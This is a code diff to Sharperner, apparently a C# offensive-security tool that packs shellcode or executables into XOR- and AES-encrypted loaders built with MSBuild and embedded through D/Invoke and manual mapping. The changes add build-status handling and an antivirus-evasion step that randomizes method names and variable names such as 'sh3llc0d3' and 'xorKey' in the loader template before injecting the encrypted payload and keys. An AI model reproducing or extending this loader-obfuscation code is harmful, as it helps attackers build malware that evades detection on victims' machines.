@@ -345,6 +345,7 @@ namespace Sharperner
 
                 using (Process compiler = new Process())
                 {
+
                     compiler.StartInfo.FileName = @"CMD.exe";
                     compiler.StartInfo.Arguments = strCmd;
                     compiler.StartInfo.UseShellExecute = false;
@@ -352,10 +353,24 @@ namespace Sharperner
                     compiler.StartInfo.RedirectStandardError = true;
                     compiler.StartInfo.RedirectStandardOutput = true;
                     compiler.Start();
+                    StringBuilder output = new StringBuilder();
+                    compiler.OutputDataReceived += (sender, a) => output.AppendLine(a.Data);
+                    compiler.BeginOutputReadLine();
                     compiler.WaitForExit();
 
+                    //Console.WriteLine($"nahhh {output}");
+
+
+                    if (output.ToString().Contains("Build FAILED"))
+                    {
+                        return false;
+                    }
+                    else
+                    {
+                        return true;
+                    }
+
                 }
-                return true;
             }
             catch
             {
@@ -1089,13 +1104,14 @@ Sharperner.exe /convert:file.exe
 
                                 if (Compile.CompileWithMSBuild(msBuildPath, projFile, "loader", "x64"))
                                 {
-                                    Console.Write("  OK!\n");
+                                    Console.Write(" [OK]\n");
 
                                     //wait for it to compile
                                     Thread.Sleep(2000);
                                 }
                                 else
                                 {
+                                    Console.Write(" [FAILED]\n");
                                     return;
                                 }
 
@@ -1214,6 +1230,30 @@ Sharperner.exe /convert:file.exe
 
                         try
                         {
+                            // randomize method names
+                            var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
+                            var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
+                            Regex rg = new Regex(pattern);
+                            MatchCollection methods = rg.Matches(templateFileContent);
+                            foreach (var method in methods)
+                            {
+                                if (!method.ToString().Contains("Main"))
+                                {
+                                    var methodName = Regex.Match(method.ToString(), methodNamesPattern);
+                                    templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                                }
+
+                            }
+
+                            //randomize variable names
+                            string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "rahsia", "bytesWritten", "process", "sh3llc0d3", "processInfo", "address",
+                                                        "theKey","mixed", "startInfo","DefaultProcPath", "codes", "titik", "aesEncrypted"};
+
+                            foreach (string variableName in variableNames)
+                            {
+                                templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
+                            }
+
                             templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
                         }
                         catch
@@ -1259,13 +1299,14 @@ Sharperner.exe /convert:file.exe
 
                                 if (Compile.CompileWithMSBuild(msBuildPath, projFile, "Dlllauncher", "x64"))
                                 {
-                                    Console.Write("  OK!\n");
+                                    Console.Write("  [OK]\n");
 
                                     //wait for it to compile
                                     Thread.Sleep(2000);
                                 }
                                 else
                                 {
+                                    Console.Write("  [FAILED]!\n");
                                     return;
                                 }
 
@@ -1367,7 +1408,7 @@ Sharperner.exe /convert:file.exe
                                 var tempLoaderFileContent = loaderFileContent;
                                 var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
 
-                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit.");
+                                Console.WriteLine("[+] Embedding into .NET using Manual Mapping. Credits to @SharpSploit.");
 
                                 var PEFile = File.ReadAllBytes(filePath);
                                 var msBuildPath = GetMSBuildPath();
@@ -1428,12 +1469,13 @@ Sharperner.exe /convert:file.exe
 
                                         if (Compile.CompileWithMSBuild(msBuildPath, projFile, "DInvoke", "x64"))
                                         {
-                                            Console.Write("  OK!\n");
+                                            Console.Write("  [OK]\n");
 
                                             Thread.Sleep(2000);
                                         }
                                         else
                                         {
+                                            Console.Write("  [FAILED]\n");
                                             return;
                                         }
 
